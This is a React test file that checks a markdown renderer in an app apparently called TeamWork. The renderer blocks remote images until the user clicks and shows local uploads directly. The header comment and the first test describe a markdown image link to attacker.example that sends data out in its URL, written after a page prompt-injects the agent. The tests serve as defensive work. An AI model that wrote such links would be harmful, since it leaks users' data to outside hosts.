/**
 * Images from other sites load on a click. Rendering one fetches its URL as
 * soon as the message appears, and a URL can carry data out (a page that gets
 * the agent to write ![x](https://attacker.example/p.png?d=<notes>)).
 */
import { describe, expect, it, vi } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import { MarkdownContent, isLocalImage } from './MarkdownContent';

vi.mock('mermaid', () => ({ default: { initialize: vi.fn(), render: vi.fn() } }));

describe('images in markdown', () => {
  it('does not fetch an image from another site until clicked', () => {
    const { container } = render(
      <MarkdownContent content={'![chart](https://attacker.example/p.png?d=secret)'} darkMode={false} />);
    expect(container.querySelector('img')).toBeNull();
    const gate = screen.getByRole('button', { name: /attacker\.example.*click to load/ });
    fireEvent.click(gate);
    const img = container.querySelector('img');
    expect(img?.getAttribute('src')).toBe('https://attacker.example/p.png?d=secret');
    expect(img?.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('shows images from TeamWork itself straight away', () => {
    const own = `${window.location.origin}/api/uploads/y.png`;
    const { container } = render(<MarkdownContent
      content={`![a](/api/uploads/x.png) ![b](${own})`} darkMode={false} />);
    expect(container.querySelectorAll('img')).toHaveLength(2);
    expect(screen.queryByRole('button')).toBeNull();
  });

  it('tells local from remote', () => {
    const base = 'https://teamwork.example.ts.net/project/1';
    expect(isLocalImage('/api/uploads/a.png', base)).toBe(true);
    expect(isLocalImage('https://teamwork.example.ts.net/x.png', base)).toBe(true);
    expect(isLocalImage('data:image/png;base64,AA', base)).toBe(true);
    expect(isLocalImage('//evil.example/x.png', base)).toBe(false);
    expect(isLocalImage('https://evil.example/x.png', base)).toBe(false);
    expect(isLocalImage('http://teamwork.example.ts.net/x.png', base)).toBe(false);
  });
});
